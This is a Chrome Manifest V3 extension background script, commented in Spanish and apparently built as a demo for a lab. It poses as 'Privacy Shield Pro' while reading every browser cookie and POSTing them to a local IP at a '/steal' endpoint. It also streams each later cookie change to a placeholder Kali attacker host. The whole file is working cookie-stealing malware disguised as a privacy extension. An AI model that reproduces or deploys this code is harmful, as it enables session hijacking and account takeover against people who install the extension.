// === Manifest V3 COMPATIBLE ===
// Robar TODAS las cookies (Manifest V3)
chrome.cookies.getAll({}, function(cookies) {
    console.log('[V3 Demo] Enviando', cookies.length, 'cookies');
    fetch('http://192.168.1.131:5000/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            type: 'cookies_v3',
            data: cookies,
            timestamp: new Date().toISOString()
        })
    }).catch(e => console.error('Error enviando cookies:', e));
});

// Escuchar cambios en cookies (para capturar nuevas sesiones)
chrome.cookies.onChanged.addListener(function(changeInfo) {
    console.log('[V3 Demo] Cookie modificada:', changeInfo.cookie.name);
    fetch('http://TU_IP_KALI:5000/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            type: 'cookie_change_v3',
            data: changeInfo,
            timestamp: new Date().toISOString()
        })
    }).catch(e => console.error('Error:', e));
});

// Mensaje de inicio (para verificar que la extensión está activa)
console.log('[V3 Demo] Privacy Shield Pro - Background service worker activo');
